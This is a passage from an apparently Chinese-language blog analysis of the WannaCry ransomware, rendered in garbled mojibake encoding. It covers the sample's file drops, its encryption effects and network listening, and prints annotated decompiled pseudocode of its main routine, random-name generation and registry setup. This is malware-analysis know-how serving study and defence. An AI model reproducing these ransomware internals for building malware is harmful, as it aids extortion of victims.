width="13"><p>å›¾åä¸€ï¼šæ–‡ä»¶ç›‘æ§</p><p>é€šè¿‡å¯¹æ–‡ä»¶çš„ç›‘æ§ï¼Œæˆ‘ä»¬å‘ç°æ–‡ä»¶åœ¨ç—…æ¯’æ–‡ä»¶å¤¹é‡Œæ”¾ç½®äº†</p><p>Pkyï¼Œekyï¼Œres æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç—…æ¯’æ‰€éœ€è¦çš„å…¬é’¥ï¼Œç§é’¥ç­‰æ–‡ä»¶</p><p>Bat æ–‡ä»¶ï¼Œæ˜¯ç—…æ¯’æ‰€éœ€è¦æ‰§è¡Œçš„ç¹æ‚çš„é‡å¤æ€§çš„å·¥ä½œ</p><p>Vbs æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç—…æ¯’æ‰§è¡Œæ—¶çš„ä¸­é—´æ–‡ä»¶ï¼Œç”¨äºæ‰§è¡Œæ„ŸæŸ“æ“ä½œ</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image14.jpeg" class="" width="14"><p>å›¾åäºŒï¼šæ–‡ä»¶è¡Œä¸ºç›‘æ§</p><p>ç»§ç»­è¿›è¡Œæ–‡ä»¶è¡Œä¸ºçš„ç›‘æ§ï¼Œç›‘æ§åˆ°æ–‡ä»¶åœ¨è‡ªå·±çš„è·¯å¾„é‡Šæ”¾è§£å‹æ–‡ä»¶çš„æ“ä½œï¼Œå°è¯äº†æˆ‘ä»¬ä¹‹å‰å¯¹äºèµ„æºæ®µçš„åˆ†æã€‚</p><h3 id="4-2-4-æ„ŸæŸ“æ•ˆæœ"><a href="#4-2-4-æ„ŸæŸ“æ•ˆæœ" class="headerlink" title="4.2.4 æ„ŸæŸ“æ•ˆæœ"></a>4.2.4 æ„ŸæŸ“æ•ˆæœ</h3><p>åœ¨ç—…æ¯’æ„ŸæŸ“åï¼Œåˆ†æç—…æ¯’æ„ŸæŸ“çš„ç»“æœï¼š</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image15.jpeg" class="" width="15"><p>å›¾åä¸‰ï¼šæ„ŸæŸ“ç—…æ¯’æ–‡ä»¶</p><p>å¯ä»¥çœ‹åˆ°ï¼Œç—…æ¯’åœ¨æ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹æ–°å»ºäº†ä¸€ä¸ª@Please_Read_Me@.txtå’Œ @WanaDecryptor@.exeç”¨äºè¦æ±‚ç”¨æˆ·æ”¯ä»˜è§£é”è´¦æˆ·ï¼Œå¹¶å°†å…¶ä»–æ–‡ä»¶åŠ å¯†ä¸ºä»¥.WNCRYçš„æ–‡ä»¶</p><h3 id="4-2-5-ç½‘ç»œç›‘æ§"><a href="#4-2-5-ç½‘ç»œç›‘æ§" class="headerlink" title="4.2.5 ç½‘ç»œç›‘æ§"></a>4.2.5 ç½‘ç»œç›‘æ§</h3><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image16.png" class="" width="16"><p>å›¾åå››ï¼šç½‘ç»œè¿æ¥æƒ…å†µ</p><p>é€šè¿‡åˆ†æç—…æ¯’é‡Šæ”¾çš„æ–‡ä»¶ taskhsvc.exe<br>çš„è”ç½‘æƒ…å†µï¼Œæˆ‘ä»¬çœ‹åˆ°ç—…æ¯’ä¸€ç›´åœ¨å¯¹49159å’Œ9050ç«¯å£è¿›è¡Œç›‘å¬ï¼Œå¹¶åˆ©ç”¨ç«¯å£å°è¯•å¯¹å±€åŸŸç½‘å†…çš„ä¸€äº›IPè¿›è¡Œæ¸—é€ã€‚</p><h1 id="5-wncry-exe-ç—…æ¯’ä¸»ç¨‹åºåˆ†æ"><a href="#5-wncry-exe-ç—…æ¯’ä¸»ç¨‹åºåˆ†æ" class="headerlink" title="5 wncry.exe ç—…æ¯’ä¸»ç¨‹åºåˆ†æ"></a>5 wncry.exe ç—…æ¯’ä¸»ç¨‹åºåˆ†æ</h1><h2 id="5-1-ä¸»ä½“é€»è¾‘"><a href="#5-1-ä¸»ä½“é€»è¾‘" class="headerlink" title="5.1 ä¸»ä½“é€»è¾‘"></a>5.1 ä¸»ä½“é€»è¾‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __stdcallÂ <span class="title">WinMain</span><span class="params">(HINSTANCEÂ hInstance,Â HINSTANCEÂ hPrevInstance,Â LPSTRÂ lpCmdLine,Â <span class="keyword">int</span>Â nShowCmd)</span>Â Â </span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">FilenameÂ =Â byte_40F910;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v12,Â <span class="number">0</span>,Â <span class="number">0x204</span>u);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆå§‹åŒ–å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">v13Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v14Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>,Â &amp;Filename,Â <span class="number">0x208</span>u);Â Â Â Â Â <span class="comment">//Â è·å–å½“å‰è¿›ç¨‹çš„å®Œæ•´è·¯å¾„Â Â </span></span><br><span class="line"></span><br><span class="line">GetRandom((<span class="keyword">int</span>)RandResult);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–ä¸€ä¸²éšæœºçš„å­—æ¯+æ•°å­—Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *(_DWORDÂ *)_p___argc(Str)Â !=Â <span class="number">2</span>Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœå‘½ä»¤è¡Œå‚æ•°ä¸ªæ•°ä¸ç­‰äº2Â Â </span></span><br><span class="line"></span><br><span class="line">||Â (v5Â =Â _p___argv(),Â <span class="built_in">strcmp</span>(*(<span class="keyword">const</span>Â <span class="keyword">char</span>Â )(*(_DWORDÂ *)v5Â +Â <span class="number">4</span>),Â aI))Â Â </span><br><span class="line"></span><br><span class="line">||Â !sub_401B5F(<span class="number">0</span>)Â Â </span><br><span class="line"></span><br><span class="line">||Â (CopyFileA(&amp;Filename,Â FileName,Â <span class="number">0</span>),Â GetFileAttributesA(FileName)Â ==Â <span class="number">-1</span>)Â Â </span><br><span class="line"></span><br><span class="line">||Â !sub_401F5D()Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">ifÂ (Â strrchr(&amp;Filename,Â &#x27;&#x27;)Â )Â Â Â Â Â Â Â Â Â Â Â Â Â //Â æŸ¥æ‰¾åœ¨å½“å‰æ–‡ä»¶è·¯å¾„ä¸­çš„ä½ç½®Â Â </span><br><span class="line"></span><br><span class="line">*strrchr(&amp;Filename,Â &#x27;&#x27;)Â =Â 0;Â Â </span><br><span class="line"></span><br><span class="line">SetCurrentDirectoryA(&amp;Filename);Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ‡æ¢å½“å‰çš„å·¥ä½œç›®å½•Â Â </span></span><br><span class="line"></span><br><span class="line">SetReg(<span class="number">1</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è®¾ç½®å½“å‰è¿›ç¨‹ç›®å½•åˆ°æ³¨å†Œè¡¨é¡¹Â </span></span><br><span class="line"></span><br><span class="line">ReleaseFiles(<span class="number">0</span>,Â ::Str);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é‡Šæ”¾æ–‡ä»¶å’Œè¯­è¨€åŒ…åˆ°å·¥ä½œè·¯å¾„ä¸‹Â Â </span></span><br><span class="line"></span><br><span class="line">WriteCwnry();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é‡å†™c.wnryæ–‡ä»¶Â æ·»åŠ æ¯”ç‰¹å¸è´¦æˆ·Â Â </span></span><br><span class="line"></span><br><span class="line">ExeCmdCommand(CommandLine,Â <span class="number">0</span>,Â <span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â éšè—å½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶Â </span></span><br><span class="line"></span><br><span class="line">ExeCmdCommand(aIcaclsGrantEve,Â <span class="number">0</span>,Â <span class="number">0</span>);Â Â Â Â Â Â Â <span class="comment">//Â æ·»åŠ Everyoneç”¨æˆ·Â æˆäºˆallè®¿é—®æƒé™Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â GetApis()Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–ä¸€äº›å¿…è¦çš„APIå‡½æ•°åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">CDatabase::CDatabase(<span class="keyword">this</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ„é€ å‡½æ•°Â åˆå§‹åŒ–ä¸´ç•ŒåŒºÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ImportKeyAndAllocMem(<span class="keyword">this</span>,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>)Â )<span class="comment">//Â å¯¼å…¥ç§é’¥å¹¶ä¸”åˆ†é…ä¸¤å—å›ºå®šå†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">DecryptFileSizeÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">pFileÂ =Â (<span class="keyword">void</span>Â *)DecryptFile(<span class="keyword">this</span>,Â t_wnry,Â (<span class="keyword">int</span>)&amp;DecryptFileSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â ä»t.wnryä¸­è§£å¯†å‡ºä¸€ä¸ªdllæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â pFileÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBaseÂ =Â WriteAllocMem(pFile,Â DecryptFileSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â ç”³è¯·ä¸€å—å †ç©ºé—´Â å¹¶æŠŠè§£å¯†å‡ºçš„dllå†™å…¥åˆ°å †ç©ºé—´Â pHeapBase=dll-&gt;Ntå¤´Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â pHeapBaseÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">TaskStartAddrÂ =Â (<span class="keyword">void</span>Â (__stdcallÂ *)(_DWORD,Â _DWORD))GetExportFunAddr((<span class="keyword">int</span>)pHeapBase,Â TaskStart);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â TaskStartAddrÂ )Â Â <span class="comment">//Â ä»å †ç©ºé—´ä¸­å–å‡ºdllå¯¼å‡ºå‡½æ•°çš„åœ°å€Â å¹¶è°ƒç”¨Â </span></span><br><span class="line"></span><br><span class="line">TaskStartAddr(<span class="number">0</span>,Â <span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">CDatabase::~CDatabase((CDatabaseÂ *)<span class="keyword">this</span>);Â <span class="comment">//Â ææ„å‡½æ•°Â é‡Šæ”¾èµ„æºÂ Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹ä¸»é¢˜çš„å®Œæ•´æ³¨é‡Šæˆ‘ä»¬å¤§è‡´äº†è§£äº†ç—…æ¯’æ‰€è¿›è¡Œçš„ä¸»è¦æ“ä½œï¼Œç»æ€»ç»“ä¸ºå¦‚ä¸‹è¿‡ç¨‹ï¼š</p><ol><li><p> åˆå§‹åŒ– å†…å­˜ï¼Œå·¥ä½œç›®å½•å’Œéšæœºæ•°</p></li><li><p> è®¾ç½®æ³¨å†Œè¡¨é¡¹ä¸ºå½“å‰è¿›ç¨‹ç›®å½•</p></li><li><p> é‡Šæ”¾èµ„æºåŒ…å†…çš„æ–‡ä»¶å’Œè¯­è¨€åŒ…</p></li><li><p> åœ¨c.wnry å†…æ·»åŠ æ¯”ç‰¹å¸è´¦æˆ·</p></li><li><p> éšè—å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶</p></li><li><p> è¿›è¡ŒåŠ è§£å¯†æ“ä½œ</p></li><li><p> é‡Šæ”¾èµ„æº</p></li></ol><p>ä»¥ä¸Šè¿‡ç¨‹èƒ½å®Œæ•´çš„å±•ç°å‡ºäº†ç—…æ¯’è¿›è¡Œçš„æ“ä½œï¼Œä½†æ˜¯æœ‰ä¸€äº›æ“ä½œç”±äºå‚æ•°è®¾ç½®é”™è¯¯ï¼Œå®é™…ä¸Šæ²¡æœ‰å®ç°ã€‚æ¥ä¸‹æ¥æˆ‘å°†å¯¹ç—…æ¯’çš„å…·ä½“è¡Œä¸ºè¿›è¡Œåˆ†ææ€»å…±åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†<br>ç¬¬ä¸€éƒ¨åˆ† åˆå§‹åŒ–æ“ä½œ ç¬¬äºŒéƒ¨åˆ† åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ</p><h2 id="5-2-åˆå§‹åŒ–æ“ä½œ"><a href="#5-2-åˆå§‹åŒ–æ“ä½œ" class="headerlink" title="5.2 åˆå§‹åŒ–æ“ä½œ"></a>5.2 åˆå§‹åŒ–æ“ä½œ</h2><p>åˆå§‹åŒ–ä½œä¸ºç—…æ¯’æ–‡ä»¶çš„ç¬¬ä¸€éƒ¨åˆ†ä¸»è¦æ¶‰åŠå‡ ä¸ªå‡½æ•°<br>GetRandomè·å–éšæœºæ•°ï¼ŒSetRegè®¾ç½®æ³¨å†Œè¡¨ï¼ŒReleaseFiles<br>é‡Šæ”¾èµ„æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†è¿›è¡Œé€ä¸€çš„åˆ†æ</p><h3 id="5-2-1-GetRandom-è·å–éšæœºæ•°"><a href="#5-2-1-GetRandom-è·å–éšæœºæ•°" class="headerlink" title="5.2.1 GetRandom è·å–éšæœºæ•°"></a>5.2.1 GetRandom è·å–éšæœºæ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __cdeclÂ <span class="title">GetRandom</span><span class="params">(<span class="keyword">int</span>Â RandResult)</span>Â Â </span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">GetComputerNameW(&amp;ComputerName,Â &amp;nSize);Â Â Â Â Â Â <span class="comment">//Â è·å–è®¡ç®—æœºåÂ Â </span></span><br><span class="line"></span><br><span class="line">iÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v1Â =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â wcslen(&amp;ComputerName)Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœè®¡ç®—æœºåçš„é•¿åº¦ä¸ä¸º0Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v2Â =Â &amp;ComputerName;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v1Â *=Â *v2;Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â V1=[ComputerName]Â Â å³V1=è®¡ç®—æœºåçš„ç¬¬ä¸€ä¸ªå­—æ¯çš„ASCIIÂ Â </span></span><br><span class="line"></span><br><span class="line">++i;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â ä¸‹æ ‡è‡ªå¢Â Â </span></span><br><span class="line"></span><br><span class="line">++v2;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â ComputerName++ä¸¤æ¬¡Â å³æˆªæ–­è®¡ç®—æœºåçš„ç¬¬ä¸€ä¸ªå­—æ¯Â Â </span></span><br><span class="line"></span><br><span class="line">v3Â =Â wcslen(&amp;ComputerName);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â iÂ &lt;Â v3Â );Â Â &#125;Â Â Â Â Â Â Â <span class="comment">//Â å¾ªç¯æ¬¡æ•°i=strlen(Computer)Â Â Â </span></span><br><span class="line"></span><br><span class="line">srand(v1);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <span class="comment">//Â v1=è®¡ç®—æœºåæ‰€æœ‰ASCIIçš„ä¹˜ç§¯Â Â </span></span><br><span class="line"></span><br><span class="line">v4Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v5Â =Â rand()Â %Â <span class="number">8</span>Â +Â <span class="number">8</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v5Â &gt;Â <span class="number">0</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">*(_BYTEÂ *)(v4++Â +Â RandResult)Â =Â rand()Â %Â <span class="number">0x1A</span>Â +Â <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â éšæœºå–äº†ä¸€ä¸ªå­—ç¬¦ä¸²Â å‡è®¾ï¼šcecazrsgaÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â v4Â &lt;Â v5Â );Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v6Â =Â v5Â +Â <span class="number">3</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â v4Â &lt;Â v6Â )Â Â </span><br><span class="line"></span><br><span class="line">*(_BYTEÂ *)(v4++Â +Â RandResult)Â =Â rand()Â %Â <span class="number">0xA</span>Â +Â <span class="number">0x30</span>;<span class="comment">//Â éšæœºå–äº†ä¸€ä¸ªæ•°å­—122Â Â </span></span><br><span class="line"></span><br><span class="line">resultÂ =Â RandResult;Â Â </span><br><span class="line"></span><br><span class="line">*(_BYTEÂ *)(v4Â +Â RandResult)Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â result;Â Â Â &#125;Â Â <span class="comment">//Â æœ€åçš„ç»“æœç­‰äºä¸¤æ¬¡éšæœºç»“æœæ‹¼åœ¨ä¸€èµ·Â cecazrsga122Â Â </span></span><br></pre></td></tr></table></figure><p>ç—…æ¯’é¦–å…ˆè·å–è®¡ç®—æœºåASCIIç çš„è¿ä¹˜ï¼Œå¹¶ä»¥å…¶ä½œä¸ºç§å­åˆ©ç”¨rand()å‡½æ•°å¾—åˆ°ä¸€å¯¹å­—æ¯+æ•°å­—çš„éšæœºæ•°ä½œä¸ºéšæœºå­—ç¬¦ä¸²</p><h3 id="5-2-2-SetReg-è®¾ç½®æ³¨å†Œè¡¨é¡¹"><a href="#5-2-2-SetReg-è®¾ç½®æ³¨å†Œè¡¨é¡¹" class="headerlink" title="5.2.2 SetReg è®¾ç½®æ³¨å†Œè¡¨é¡¹"></a>5.2.2 SetReg è®¾ç½®æ³¨å†Œè¡¨é¡¹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span>Â <span class="keyword">int</span>Â __cdeclÂ <span class="title">SetReg</span><span class="params">(<span class="keyword">int</span>Â a1)</span> </span>&#123;Â Â Â Â </span><br><span class="line"></span><br><span class="line">wcscat(&amp;Dest,Â Source);Â Â   </span><br><span class="line"><span class="comment">//Â å­—ç¬¦ä¸²æ‹¼æ¥-&gt;SoftwareWanaCrypt0rÂ Â Â </span></span><br><span class="line"></span><br><span class="line">v12Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â <span class="number">1</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v12Â )Â Â </span><br><span class="line"></span><br><span class="line">RegCreateKeyW(HKEY_CURRENT_USER,Â &amp;Dest,Â &amp;hKey);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">RegCreateKeyW(HKEY_LOCAL_MACHINE,Â &amp;Dest,Â &amp;hKey);<span class="comment">//Â åˆ›å»ºäº†æ³¨å†Œè¡¨é¡¹Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hKeyÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â a1Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">GetCurrentDirectoryA(<span class="number">0x207</span>u,Â &amp;Buffer);Â Â <span class="comment">//Â è·å–å½“å‰çš„è¿›ç¨‹æ‰€åœ¨ç›®å½•Â Â </span></span><br><span class="line"></span><br><span class="line">v1Â =Â <span class="built_in">strlen</span>(&amp;Buffer);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–æ‰€åœ¨ç›®å½•çš„é•¿åº¦Â Â </span></span><br><span class="line"></span><br><span class="line">v2Â =Â RegSetValueExA(hKey,Â ValueName,Â <span class="number">0</span>,Â <span class="number">1u</span>,Â (<span class="keyword">const</span>Â BYTEÂ *)&amp;Buffer,Â v1Â +Â <span class="number">1</span>)Â ==Â <span class="number">0</span>;<span class="comment">//Â å°†å½“å‰exeæ‰€åœ¨çš„è·¯å¾„è®¾ç½®ä¸ºæ³¨å†Œè¡¨é¡¹çš„å€¼Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">cbDataÂ =Â <span class="number">519</span>;Â Â </span><br><span class="line"></span><br><span class="line">v3Â =Â RegQueryValueExA(hKey,Â ValueName,Â <span class="number">0</span>,Â <span class="number">0</span>,Â (LPBYTE)&amp;Buffer,Â &amp;cbData);Â Â </span><br><span class="line"></span><br><span class="line">v2Â =Â v3Â ==Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !v3Â )Â Â </span><br><span class="line"></span><br><span class="line">SetCurrentDirectoryA(&amp;Buffer);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">RegCloseKey(hKey);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v2Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ++v12Â &gt;=Â <span class="number">2</span>Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>å¯è§ç—…æ¯’åˆ›å»ºäº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹<br>å¹¶å°†å½“å‰ç—…æ¯’ä¸»ä½“æ‰€åœ¨ä½ç½®çš„å†³å®šè·¯å¾„è®¾ç½®åˆ°æ³¨å†Œè¡¨çš„<br>HKEY_LOCAL_MACHINESOFTWARE 